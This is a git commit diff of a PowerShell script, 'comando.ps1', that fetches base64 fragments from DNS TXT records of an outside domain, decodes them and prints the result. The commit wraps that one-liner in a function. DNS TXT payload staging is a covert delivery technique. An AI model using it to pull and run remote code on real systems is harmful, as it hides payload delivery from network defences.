4cae17d46fc7c9cf30e5b36f88b0227ba9369972
manupython84 <68430865+manupython84@users.noreply.github.com>
2022-12-04 12:06:01 +0100

    Update comando.ps1

--- comando.ps1
+++ comando.ps1
@@ -1,1 +1,3 @@
-$b64=""; (1..3) | ForEach-Object { $b64+=(nslookup -q=txt "$_.m4n4apmedia.com")[-1] }; type([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
+function Get-ruta {
+  $b64=""; (1..3) | ForEach-Object { $b64+=(nslookup -q=txt "$_.m4n4apmedia.com")[-1] }; type([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
+}
